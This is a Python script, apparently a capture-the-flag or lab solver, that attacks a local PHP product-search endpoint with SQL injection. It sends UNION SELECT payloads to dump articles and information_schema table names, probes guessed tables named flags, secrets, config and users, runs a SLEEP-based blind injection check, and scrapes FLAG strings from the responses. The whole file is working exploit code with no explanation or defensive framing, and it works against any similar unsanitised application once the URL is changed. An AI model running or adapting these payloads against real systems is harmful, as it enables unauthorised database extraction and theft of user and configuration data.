import requests
import re

# Configuration
target_url = "http://127.0.0.1:8081/sku_search.php"
cookies = {"PHPSESSID": "05049af6efd6ed216b8a2e6938639807"}

print("SQL INJECTION TEST - Search Endpoint")
print("=" * 50)
print(f"Target: {target_url}")
print()

# Test 1: Union-based SQLi to extract all articles
print("[1] Testing UNION SELECT to extract all articles")
payload = "Test' UNION SELECT sku,name,description FROM articles-- "
data = {"search": payload}

try:
    response = requests.post(target_url, data=data, cookies=cookies, timeout=5)
    print(f"Status: {response.status_code}")
    print(f"Size: {len(response.text)} bytes")
    
    # Look for TEST articles in response
    if "TEST001" in response.text:
        print("[+] UNION query successful - extracted articles!")
        
        # Extract all article data
        articles = re.findall(r'<tr>\s*<td>([^<]+)</td>\s*<td>([^<]+)</td>\s*<td>([^<]*)</td>\s*</tr>', response.text)
        print(f"[+] Found {len(articles)} articles:")
        for sku, name, desc in articles:
            print(f"  - {sku}: {name} | {desc[:50]}")
    else:
        print("[-] No articles extracted")
        
    # Check for flags
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flags:
        print(f"[!] FLAG FOUND: {flags[0]}")
        
except Exception as e:
    print(f"[!] Error: {e}")

print()

# Test 2: Extract database structure
print("[2] Testing UNION SELECT for database info")
payload = "Test' UNION SELECT table_name,table_name,table_name FROM information_schema.tables WHERE table_schema=database()-- "
data = {"search": payload}

try:
    response = requests.post(target_url, data=data, cookies=cookies, timeout=5)
    print(f"Status: {response.status_code}")
    
    if len(response.text) > 1000:
        print("[+] Table names extracted!")
        tables = re.findall(r'<td>([^<]+)</td>', response.text)
        unique_tables = list(set(tables))
        print(f"[+] Tables found: {unique_tables}")
        
        # Check for flags table
        for table in unique_tables:
            if 'flag' in table.lower() or 'secret' in table.lower():
                print(f"[!] Interesting table found: {table}")
                
except Exception as e:
    print(f"[!] Error: {e}")

print()

# Test 3: Check for flags table directly
print("[3] Testing for flags/secrets tables")
test_tables = ["flags", "secrets", "config", "users"]
for table in test_tables:
    payload = f"Test' UNION SELECT * FROM {table}-- "
    data = {"search": payload}
    
    try:
        response = requests.post(target_url, data=data, cookies=cookies, timeout=5)
        if len(response.text) > 1000 and "TEST001" not in response.text:
            print(f"[!] Data extracted from {table} table!")
            flags = re.findall(r'FLAG\{[^}]+\}', response.text)
            if flags:
                print(f"[!] FLAG FOUND: {flags[0]}")
                break
    except:
        pass

# Test 4: Time-based blind SQLi
print("\n[4] Testing time-based blind SQLi")
payload = "Test' AND SLEEP(3)-- "
data = {"search": payload}

import time
start = time.time()
try:
    response = requests.post(target_url, data=data, cookies=cookies, timeout=10)
    elapsed = time.time() - start
    print(f"Response time: {elapsed:.2f}s")
    if elapsed >= 3:
        print("[!] Time-based SQLi confirmed - delay detected!")
except requests.exceptions.Timeout:
    print("[!] Request timed out - time-based SQLi likely working")

print("\n" + "=" * 50)
print("Testing complete")
